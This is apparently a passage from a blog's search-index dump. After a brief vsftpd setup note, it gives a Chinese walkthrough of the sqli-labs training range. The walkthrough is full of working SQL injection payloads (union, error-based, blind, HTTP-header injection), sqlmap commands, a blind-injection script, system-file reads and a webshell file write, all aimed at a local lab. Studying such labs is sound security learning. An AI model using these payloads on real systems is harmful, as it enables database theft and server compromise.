linux防火墙会阻挡其他主机的ftp访问，把ftp服务配置成被动模式，这样更安全。vim /etc/vsftpd/vsftpd.conf,进行如下设置 123pasv_enable=YESpasv_min_port=3001pasv_max_port=3101 然后重新启动systemctl restat vsftpd.service netstat -lntp |grep 21查看一下 然后设置SE Linux的规则setsebool allow_ftpd_full_access 1setsebool httpd_enable_ftp_server 1 然后配置一下防火墙应用程序-&gt;杂项-&gt;防火墙勾选ftp 端口添加 然后使用同一个局域网内的主机进行测试，是可以使用的。 然后，本机怎么使用yum源呢? 本机yum源修改yum配置文件vim /etc/yum.repos.dvim CentOS-Base.repo 只留下本地路径即可，其他删掉 测试一下yum -y clean allyum -y install httpd 本机也可以使用可以使用，配置成功。","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"sqli-labs靶场练习","slug":"靶场/sqli-labs靶场练习","date":"2019-01-29T09:05:15.000Z","updated":"2019-03-12T09:15:35.305Z","comments":true,"path":"2019/01/29/靶场/sqli-labs靶场练习/","link":"","permalink":"http://example.com/2019/01/29/%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/","excerpt":"前言web题目中好多注入啊，学习一波。","text":"前言web题目中好多注入啊，学习一波。 知识储备我是用的phpstudy，用cmd先打开数据库看看(因为忘了怎么在cmd中打开了，所以试一试)。 1F:\\phpstudy\\PHPTutorial\\MySQL\\bin&gt;mysql -u root -p 然后输入密码即可进入MySQL， information_schema在MySQL中，把【INFORMATION_SCHEMA】 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 12345678910111213141516171819下面对一些重要的数据字典表做一些说明：SCHEMATA表：提供了关于数据库的信息。TABLES表：给出了关于数据库中的表的信息。COLUMNS表：给出了表中的列信息。STATISTICS表：给出了关于表索引的信息。USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。CHARACTER_SETS表：提供了关于可用字符集的信息。COLLATIONS表：提供了关于各字符集的对照信息。COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。TABLE_CONSTRAINTS表：描述了存在约束的表。KEY_COLUMN_USAGE表：描述了具有约束的键列。ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。VIEWS表：给出了关于数据库中的视图的信息。TRIGGERS表：提供了关于触发程序的信息。原文链接：https://www.cnblogs.com/hfdp/p/5549384.html 这是一些经常用到的函数123451. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本 字符串连接函数 123concat(str1,str2,...)——没有分隔符地连接字符串concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据 Less-1 to Less10 Less-1也可以使用sqlmap sqlmap -u “http://127.0.0.1/sqlilabs/Less-1/?id=1″ –dbms mysql –level 3 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）,一些命令。 –is-dba 当前用户权限（是否为root权限）–dbs 所有数据库–current-db 网站当前数据库–users 所有数据库用户–current-user 当前数据库用户–random-agent 构造随机user-agent–passwords 数据库密码–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） 输入**?id=1**会回显出id=1的用户信息， 尝试输入**?id=1 and 1=1和?id=1 and 1=2**都可以正常回显 输入**?id=1’**，发现报错 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 是单引号闭合错误， 12?id=1&#x27; and &#x27;1&#x27;=&#x27;1 //回显正常?id=1&#x27; and &#x27;1&#x27;=&#x27;2 //无回显 输入**?id=1’–+**即可正常回显 接下来用order by来测试表的列数，?id=1&#39; order by 3--+?id=1&#39; order by 4--+ 可以看出猜测3列时，回显正常，猜测4时，报错，说明这个表有3列。 接下来使用联合查询union ?id=-1&#39; union select 1.2.3--+ 1,2,3 只是为了保证union前后两个语句的列数相同，id=-1 则是为了使前一个查询无返回结果从而返回第二个 select 的查询结果,只需要将数字替换为相应的想要查询的信息即可.比如：?id =1 union select 1,database(),user()--+ 下面使用MySQL自带的一个表information_schema，依次爆库名，爆表名，爆列名，爆数据了 爆库名?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 爆表名?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+ ?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ //可以直接爆表 爆列名?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table.name=&#39;users&#39;--+ 爆数据?id=-1&#39; union select 1,username,password from users where id=5--+ Less-2还是用ID查询?id=1 and 1=1 正常回显?id=1 and 1=2 无回显，不报错?id=1&#39; 会报错，原因是单引号出现了奇数次 整型注入，用order by测试，发现有3列?id=1 order by 4--+会报错 使用union查询?id=-1 union select 1,2,3--+1,2,3可以任意替换成其他信息， 如：?id=-1 union select 1,version(),database()--+ 然后就可以像Less-1一样了 得到数据库名字为security后爆表?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+爆列?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+爆数据?id=-1 union select 1,username,password from users where id=3--+ Less-3输入**?id=1’，报错：报错提示说)**不对，可见是单引号后面加括号形成的查询语句 尝试构造?id=1&#39;)--+,发现可以正常回显。然后就和Less-1一样的步骤。 Less-4输入’,无变化；输入”,报错， 可见是双引号和括号的闭合构造**?id=1”)–+**,正常回显payload:http://127.0.0.1/sqlilabs/Less-4/?id=-1%22)%20union%20select%201,2,database()--+然后就是前面的套路 Less-5更具体的可以看Hyafinthus ?id=1和?id=&#39;正常，且无回显；?id=1&#39;报错：字符型双注入。利用双查询注入，可以得出数据库名称 ?id=-1&#39; union select 1,count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a--+ 然后，通过group_concat()函数将查到的表名连接并返回报错，得出表名?id=-1&#39; union select 1,count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a--+即可一步步得到用户信息。 再来一个报错注入payload?id=1&#39; and updatexml(1,concat(0x7e,version(),0x7e),1)%23 Less-6输入**?id=1’**，不报错 尝试**?id=1”**,出现报错 可见，是双引号的注入，其余和Less-5一样。 Less-7分别测试?id=1,?id=1&#39;,?id=1&quot;. 输入单引号测试，出现报错。 You have an error in your SQL syntax 第一、第三条正常，第二条报错：字符型注入 注意：这里要强调一下，一般在Sql查询语句中，单双引号不能同时存在。即数字型/字符型及单/双引号注入能在这三条语句返回的结果判断出来。 分析是否存在括号及个数： ?id=1’ and 1=1–+ 将查询语句后半段注释掉发现仍报错，说明有括号。依次增加括号个数，直到回显正常. ?id=1’)) and 1=1–+ 注意：一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。 这一关是关于文件的一些操作。所以先了解一下关于文件的相关操作。 1load_file(file_name);读取文件并返回该文件的内容作为一个字符串。 使用的条件 A.必须有权限读取并且文件可读and (select count(\\*) from mysql.user)&gt;0\\* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。B.欲读取文件必须在服务器上。C.必须指定文件完整的路径D.欲读取文件必须小于max_allowed_packet 实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决： 1.绝对物理路径2.构造有效的畸形语句(报错爆出绝对路径) 实例：select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))利用hex()将文件导出来，特别是smb文件-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))注意：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69-1 union select 1,1,1,load_file(C:\\\\boot.ini)注意：路径里的/用\\代替 SELECT INTO OUTFILE &#39;file_name&#39;,导入到文件中，具体参阅其他文章。file_name 不能是一个已经存在的文件。 ?id=1和?id=1&quot;正常，?id=1&#39;报错：字符型注入注意 这里要强调一下，一般在Sql查询语句中，单双引号不能同时存在。即数字型/字符型及单/双引号注入能在这三条语句返回的结果判断出来。 分析是否存在括号及个数：?id=1&#39; and 1=1--+报错 1You have an error in your SQL syntax 说明有括号存在，依次增加括号个数，直到回显正常 ?id=1’)) and 1=1–+ 注意 一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数(存在注入点)。 尝试导出文件?id=1&#39;)) union select * from users into outfile &quot;F:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqlilabs\\\\Less-7&quot;--+ 发现无论怎么弄，但是一直报错，而且该路径下也没有出现文件 可能原因1：权限不够，需要root权限才能对数据库进行读写操作。?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+回显正常，说明不是权限问题。 可能原因2：mysql数据库中secure_file_priv的参数问题 查看官方文档，secure_file_priv参数用于限制LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录。 1.secure_file_priv为NULL时，表示限制mysqld不允许导入或导出。2.secure_file_priv为/tmp时,表示限制mysqld只能在/tmp目录中执行导入导出其他目录不能执行。3.secure_file_priv没有值时，表示不限制mysqld在任意目录的导入导出。 输入show variables like &#39;%secure%&#39;,查看secure_file_priv 的值，发现为NULL，表示限制不能导入导出 如果想要往任意路径下导入导出，那么需要把secure_file_priv的值设成空。找到mysql目录下的my.ini或者my.cnf文件，写入这句话 secure_file_priv=’’ 重启mysql服务器，再次进行查询，secure_file_priv值为空了 再次导出文件 ?id=1’)) union select 1,2,’‘ into outfile ‘F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.php’–+ 依然有报错但是该路径下已经有导出的文件了 然后菜刀连接 Less-8查看源码，发现对报错信息进行了注释，不能进行报错注入，只能盲注。盲注payload：?id=1%27and%20if(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 第一个字符?id=1&#39; and if(ascii(substr(database(),2,1))=101,1,sleep(5))--+ 第二个字符以此类推。 盲注脚本： 1234567891011121314151617181920import requestsurl = &#x27;&#x27;&#x27;http://192.168.100.102/sqlilabs/Less-8/?id=1&#x27; and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23&#x27;&#x27;&#x27;database = &#x27;&#x27;for i in range(1,9): max = 127 min = 65 while abs(max-min)&gt;1: mid = (max+min)//2 payload = url.format(_=i,__=mid) ans = requests.get(payload) if &#x27;You are in...........&#x27; in ans.content: min = mid else: max = mid database = database + chr(max) print database Less-9Less8中，输入合法时会返回正常页面“You are in”，而非法输入时没有返回任何东西。于是可以根据这个特点跑盲注，通过不同的返回页面来判断匹配的字符是否正确。而在Less9中，合法输入与非法输入返回为同一个固定字符串。这样就不能根据页面的回显来判断匹配结果，要使用延时函数sleep()对两种输入进行区分。 这一关是单引号闭合。?id=1&#39; 爆库?id=1&#39;and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 爆表?id=1&#39;and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101,1,sleep(5))--+ 爆列?id=1&#39;and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),1,1))=105,1,sleep(5))--+ 爆内容?id=1&#39;and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+ Less-10是双引号闭合?id=1&quot;?id=1&quot; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+ Less-11 to Less-20 Less-11这一关开始POST部分了,为了方便查看，使用burpsuite。 可以使用sqlmap bp抓包后，copy to file,放在sqlmap目录下， 命令如下： python sqlmap.py -r 11.txt 爆库：python sqlmap.py -r 11.txt --dbs 爆表：python sqlmap.py -r 11.txt -D 数据库名 --tables 爆列：python sqlmap.py -r 11.txt -D 数据库名 -T 表名 --columns 爆内容：python sqlmap.py -r 11.txt -D 数据库名 -T 表名 -C 列名 --dump 按步骤来就可以。 下面是手工注入 测试一下，输入username=1 password=1 抓包在burpsuite中提交参数 发现uname=1&amp;passwd=1&#39;报错uname=1&amp;passd=1和uname=1&amp;passwd=1&quot;不报错可见是单引号闭合 构造永真条件测试注入点：uname=1&amp;passwd=1&#39; or 1=1--+ 因limit0,1返回了表中第一条的信息：Dumb,Dumb，即这里存在注入点，or&#39;1&#39;=&#39;1&#39;是一个永真条件（也可以用其他永真条件替代），使查询语句相当于select username,password from users where true即select username,password from users，返回所有结果。 利用order by判断字段数uname=1&amp;passwd=1%27 order by 2--+不报错uname=1&amp;passwd=1%27 order by 2--+报错，说明有两个字段 利用union语句联合查询：得到用户名和数据库名爆库uname=1&amp;passwd=-1&#39; union select database(),user()--+ 爆表uname=1&amp;passwd=1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+ 爆列名uname=1&amp;passwd=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+ 爆内容uname=1&amp;passwd=1&#39; union select group_concat(username),group_concat(password) from users--+ Less-12uname=1&amp;passwd=1&quot;)报错，可见是双引号+括号闭合 其他操作就和Less-11一样。 Less-13uname=1&amp;passwd=1和uname=1&amp;passwd=1&quot;不报错uname=1&amp;passwd=1&#39;报错,缺少一个括号 uname=1&amp;passwd=1&#39;)--+闭合 uname=1&amp;passwd=1&#39;) union select database(),user()--+居然无回显，看来是想错了 这题和上面的几道不一样，而是和Less-5差不多 尝试一个报错注入payload,成功爆库 uname=1&amp;passwd=1&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 也可以双查询注入 uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a--+ 注意：如果上面的语句没有反应的话，先进行url编码试试看 很奇怪，有时可以回显，有时不能回显。 报错注入比较好使。 爆库 得到库名和用户名 爆表 uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a--+ 爆字段 uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),floor(rand()*2)) as a from information_schema.tables group by a--+ 爆内容 uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select concat_ws(&#39;-&#39;,id,username,password) from users limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+ Less-14是双引号闭合，其他和上面一样。 Less-15其实从前面几关开始，正确回显，是显示这张照片 错误回显，是显示这张照片。 挨个测试这些 uname=1&amp;passwd=1 or 1=1–+uname=1&amp;passwd=1’ or 1=1–+uname=1&amp;passwd=1” or 1=1–+uname=1&amp;passwd=1’) or 1=1–+uname=1&amp;passwd=1”) or 1=1–+ 经过测试，uname=1&#39; or 1=1#$passwd=1回显正确，uname=1 or 1=1#$passwd=1和uname=1&quot; or 1=1#$passwd=1是不能正确回显的。 所以是bool型单引号闭合盲注，然后就是盲注的套路。 Less-16转自简书Hyafinthus 这两关的后台php文件其实是一样的，只是为了练习两种盲注方式。 注入方式与回显对比GET Less 注入方法 正确回显 错误回显 1 基于错误注入 查询到的用户名和密码 Mysql错误信息 5 双注入 固定字符串 Mysql错误信息 7 导出文件注入 固定字符串 另一固定字符串 8 Bool型盲注 固定字符串 无 9 Time型盲注 固定字符串 同一固定字符串 POST Less 注入方法 成功回显 失败回显 错误回显 11 基于错误注入 用户名和密码 (flag.jpg) 无 (slap.jpg) Mysql错误信息 (slap.jpg) 13 双注入 无 (flag.jpg) 无 (slap.jpg) Mysql错误信息 (slap.jpg) 15 Bool/Time型盲注 无 (flag.jpg) 无 (slap.jpg) 无 (slap.jpg) 注意：GET和POST差别在于，GET只需要提交参数id，而POST则需要username与password都正确。 分析查询语句不像GET中若出现错误回显必是Mysql语法错误（提交时使id存在），POST若不返回Mysql错误信息，光凭一个登录失败是分不清是用户名和密码不正确还是出现了Mysql语法错误。 所以我们就需要在POST时构造永真条件使返回忽略用户名和密码不正确这种情况。若将查询语句闭合则会显示登陆成功，则可以依次增加小括号个数分析查询语句： uname=1&amp;passwd=1 or 1=1–+uname=1&amp;passwd=1’ or 1=1–+uname=1&amp;passwd=1” or 1=1–+uname=1&amp;passwd=1’) or 1=1–+uname=1&amp;passwd=1”) or 1=1–+ 经测试是time型双引号加小括号的盲注。试了一下bool也行。 Less-17这个不知道怎么写，在网上查了好多，才看明白点。 作者：Hyafinthus 链接：https://www.jianshu.com/p/62d394c38230 如果想看详细的请看一下这位博主的文章sqlilabs的题解，非常的详细。Hyafinthus，我也是参考他的文章学的。 查看源码 123456789101112131415161718192021222324if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;//making sure uname is not injectable$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;);fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) &#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; $row1 = $row[&#x27;username&#x27;]; //echo &#x27;Your Login name:&#x27;. $row1; $update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update); check_input() 123456789101112131415161718192021222324function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 几个PHP函数 substr()函数 1substr(string,start[,length]) 参数 描述 string 必需，规定要返回其中一部分的字符串 start 必需，规定在字符串的何处开始 正数：在字符串的指定位置开始 负数：在从字符串结尾开始的指定位置开始 0：在字符串中的第一个字符处开始 length 可选，要返回的字符数。如果省略，则返回剩余文本 正数：从start参数所在的位置返回的长度 负数：从字符串末端返回的长度 get_magic_quotes_gpc()函数 get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。 当magic_quotes_gpc打开时，所有的&#39;(单引号)、&quot;(双引号)、\\(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。 addslashes()与stripslashes()函数 addslashes(string)函数返回在预定义字符之前添加反斜杠\\的字符串： 单引号 &#39; ，双引号 &quot; ，反斜杠 \\ ，空字符 NULL 该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 注意：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。 ` stripslashes(string)函数删除由addslashes()`函数添加的反斜杠。 ctype_digit()函数 ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。 mysql_real_escape_string()函数 1mysql_real_escape_string(string,connection) 参数 描述 string 必需，规定要转义的字符串 connection 可选，规定MySQL连接。如果未规定，则使用上一个连接 mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符： \\x00,\\n,\\r,\\,&#39;,&quot;,\\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回FALSE。 本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于mysql_query()，可使用本函数来预防数据库攻击。 intval()函数 1intval(var[,base]) 参数 描述 var 要转换成integer的数量值 base 转化所使用的进制 intval()函数获取变量的整数值。通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。 成功时返回var的integer值，失败时返回0。空的array返回0，非空的array返回1，最大的值取决于操作系统。 如果base是0，通过检测var的格式来决定使用的进制： 如果字符串包括了0x或0X的前缀，使用16进制hex；否则， 如果字符串以0开始，使用8进制octal；否则， 使用10进制decimal。 有参数检查与过滤 注意：在用uanme查询之前，它用check_input()函数做了检查。 1. 若uname非空，截取它的前15个字符。 2. 若php环境变量magic_quotes_gpc打开，去除转义的反斜杠\\。 3. 若uname字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。 所以我们几乎不可能在uname处注入，唯一的注入点在passwd处。 子查询注入 当在一个聚合函数如count()函数后面，如果使用分组语句如group by就会把查询的一部分以错误的形式显示出来。 选择哪种方式 子查询注入在Less-5中即双注入，对于update、delete和insert通常都用结合or的逻辑判断。 在后台是select语句时我们能通过union联合查询CONCAT子查询（即Less5使用的双注入）获得错误信息中的数据。 而这里的后台是update（delete/insert）语句，我们只能通过or逻辑判断派生表（在Less5中提到一句）来获得错误信息中的数据。 注意：**上面这段是根据实际情况推断出的，但没有触及原理，也不完全正确。经过对比Less5的两种子查询和查找资料，得到了正确的结论。 使用CONCAT子查询时，错误信息提示子查询中应该只包含一个字段。 uname=admin&amp;passwd=&#39; or (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a) where username=&#39;admin&#39;--+ 使用派生表时，错误信息能返回我们想要的数据。 uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&#39;admin&#39;--+ 在下一步之前，我们先理清子查询与派生表。 子查询与派生表 子查询有两种：一是WHERE子句中的子查询；二是FROM子句中的子查询，这种子查询又被称为派生表。 WHERE子句中： 12345SELECT column_nameFROM table_nameWHERE column_name IN (SELECT column_name FROM table_name WHERE condition) FROM子句中： 12345SELECT column_nameFROM (SELECT column_name FROM table_name WHERE condition) derived_table_nameWHERE condition 可以看出这两种实际上并无区别！ 只是在Less-5中select查询返回的字段数为3，足够在column_list中将count()和concat()都包含进去，所以用CONCAT子查询更简单。 而在Less-17中update查询返回的字段数只有1！不足以使count()后接上concat()这样一个查询语句，这时候就只能通过派生表再将上一层子查询包裹起来，通过select 1 from (报错的CONCAT子查询) derived_table_name使注入查询的字段与update查询的字段数相等！ （严格来说，这里已经不能叫双注入而是三注入了，都称为子查询注入） 所以，子查询注入重点在于控制子查询使涉及字段数相等。select使用union，update/delete/insert使用or。而CONCAT子查询或是派生表只是手段。 派生表注入过程爆库 uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&#39;admin&#39;--+ 爆表 uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&#39;admin&#39;--+ 一直没成功Subquery returns more than 1 row子查询返回多行 于是用limit来限制范围，一条一条的来查询，结果一直找不到limit放的位置，以后在研究吧。 爆字段 uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;admin&#39;--+ 这个也一样Subquery returns more than 1 row 爆内容 uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(**select concat_ws(&#39;-&#39;,id,username,password) from users limit 0,1**),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;admin&#39;--+ 不知道为啥开始也报了几次Subquery returns more than 1 row，多提交了几次就可以了。 updatexml()注入 updatexml()函数 1updatexml(xml_target,xpath_expr,new_xml) 参数 描述 xml_target 目标xml，形式类似于节点目录 xpath_expr xml的表达式（xpath格式） new_xml 用来替换的xml updatexml()函数是MySQL对xml文档数据进行查询和修改的xpath函数。 简单来说就是，用new_xml把xml_target中包含xpath_expr的部分节点（包括xml_target）替换掉。 如：updatexml(asd, ‘//b’, abc)， 运行结果：abc， 其中’//b’的斜杠表示不管b节点在哪一层都替换掉，而’/b’则是指在根目录下替换，此处xml_target的根目录节点是a。 注入原理 updatexml()的xml_target和new_xml参数随便设定一个数，这里主要是利用报错返回信息。利用updatexml()获取数据的固定payload是： ... or updatexml(1,concat(&#39;#&#39;,(select * from (select ...) a)),0) ... 注入过程爆库 uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(database())),0)--+ &#39; and updatexml(1,concat(0x7e,database(),0x7e),1)# 0x7e表示~ 注意：因为xpath_expr是xpath格式，所以不是所有字符都可以作为concat()的连接符，如-、@便不可以。 爆表 uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0)--+ 注意：这里不要用concat_ws()，会有未知错误使错误回显显示不全。 爆列 uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0)--+ 爆内容 uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select concat(id,&#39;#&#39;,username,&#39;#&#39;,password) from users limit 0,1)),0)--+ 报错，You can&#39;t specify target table &#39;users&#39; for update in FROM clause&gt;您无法在FROM子句中为更新指定目标表’users’ 意思是不能先select表中的某些值，再update这个表（在同一语句中）。 解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误。 注意：此问题只出现于MySQL，msSQL和Oracle不会出现此问题。 uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0)--+ 注意：这里的错误信息只显示了一部分，所以没有一次性输出所有数据（可以做到），而使用limit偏移注入。 Less-18原文链接 分析 尝试了很多次之后，发现回显能够显示你的IP地址，看一下源码。 12$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; 源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分：User-Agent。 而获取IP则使用了REMOTE_ADDR，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的。 再看源码： 12$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]); 对POST的uname和passwd都做了check_input()处理，在Less-17已经分析了这个函数，所以表单不存在注入点。 不论是否登录成功，都会回显IP。 登陆成功后回显uagent，并将uagent、IP、uname插入到security数据库的uagents表的uagent、ip_address、username三个字段中。 用已知的用户名登陆一下，并且测试一下X-Forwarded-For和User-Agent 经过这次尝试可以看到：修改XFF头对IP没有影响，登陆成功会回显你的User-Agent。 这里要输入正确的账号和密码才能绕过账号密码判断，进入处理User-Agent部分。这跟现实中的注册登录再注入是比较贴合。 所以注入点就在User-Agent处。 注入这里我们仍需要根据回显报错来判断INSERT语句结构，首先任意尝试： User-Agent: Hyafinthus&#39; updatexml(1,concat(&#39;#&#39;,(database())),0)--+ 源码中 $insert=”INSERT INTO security.uagents (uagent, ip_address, username) VALUES (‘$uagent’, ‘$IP’, $uname)”; 可以看到uagent是在IP和uname之前的 爆库 User-Agent: Specter&#39; or updatexml(1,concat(&#39;#&#39;,(database())),0),&#39;&#39;,&#39;&#39;)# User-Agent: Specter&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1 注意：这里并不是URL而是HTTP头，所以+并不会被转义为(空格)，于是末尾的注释符号要变为#。 爆表 User-Agent: Specter&#39; and updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;,&#39;&#39;)# 试了一下and也行 爆列 User-Agent: &#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0),&#39;&#39;,&#39;&#39;)# 爆内容 User-Agent: &#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0),&#39;&#39;,&#39;&#39;)# Less-19分析登录后，回显Referer信息， 登录成功后发现回显的是Referer不是User-Agent，判断INSERT语句结构： Referer: Specter&#39; updatexml(1,concat(&#39;#&#39;,(database())),0)# 应该是表的结构变了，查看源码，只有referer和IP insert=”INSERT INTO security.referers (referer, ip_address) VALUES (‘$uagent’, ‘$IP’)”; 知道了表的结构就可已注入了。 注入爆库：Referer: &#39; or 